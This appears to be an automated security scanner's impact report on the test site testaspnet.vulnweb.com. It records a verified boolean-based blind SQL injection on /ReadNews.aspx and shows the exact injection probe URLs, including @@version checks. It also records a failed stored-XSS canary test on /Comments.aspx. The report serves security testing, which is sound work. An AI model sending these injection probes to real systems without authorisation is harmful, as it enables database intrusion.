# L3 Proven Real Impact — http://testaspnet.vulnweb.com
run `run-4fe17c44cc` — layer sentinel-impact/4.4.0

- impacts: 2 total / **1 VERIFIED** / 0 INFERRED / 1 PROBE_FAILED / 0 NOT_SAFE_TO_PROVE / 0 REFUSED
- safety ceiling: capability proven, not exploited — أُثبتت القدرة، لم تُستغَل

## sql_version_oracle — VERIFIED
- path `L3P-dd590073f0` findings ['F-1e2f9fefe2'] — sql_version_oracle at /ReadNews.aspx (param id) — minimal benign proof
- detail: `{"control_true_size": 30554, "control_false_size": 13444, "version_true_size": 30608, "version_false_size": 13552, "version_char": null, "digit_probes": {"version_digit_5": 13534, "version_digit_8": 13534}}`
- evidence [probe] pr-0001: '\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//'
  - probe: GET http://testaspnet.vulnweb.com/ReadNews.aspx?id=2+AND+1%3D1 body=''
  - response: status 200 body='\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\r\n<HTML>\r\n\t<HEAD>\r\n\t\t<tit'
- evidence [probe] pr-0002: '\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//'
  - probe: GET http://testaspnet.vulnweb.com/ReadNews.aspx?id=2+AND+1%3D2 body=''
  - response: status 200 body='\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\r\n<HTML>\r\n\t<HEAD>\r\n\t\t<tit'
- evidence [probe] pr-0003: '\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//'
  - probe: GET http://testaspnet.vulnweb.com/ReadNews.aspx?id=2+AND+%40%40version+LIKE+%27%25%27 body=''
  - response: status 200 body='\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\r\n<HTML>\r\n\t<HEAD>\r\n\t\t<tit'
- evidence [probe] pr-0004: '\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//'
  - probe: GET http://testaspnet.vulnweb.com/ReadNews.aspx?id=2+AND+%40%40version+LIKE+%27zzz-sentinel-nope%25%27 body=''
  - response: status 200 body='\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\r\n<HTML>\r\n\t<HEAD>\r\n\t\t<tit'

## xss_stored_persistence — PROBE_FAILED
- path `L3P-ed0bc692be` findings ['F-9779edbacd'] — xss_stored_persistence at /Comments.aspx (param tbComment) — minimal benign proof
- reason: the stored canary did not persist AND execute (measured below) — honest failure
- detail: `{"resubmit_status": 200, "fired": false, "payload_rides_the_request": true, "observed_flag": "", "expected_flag": "l3stocanary"}`

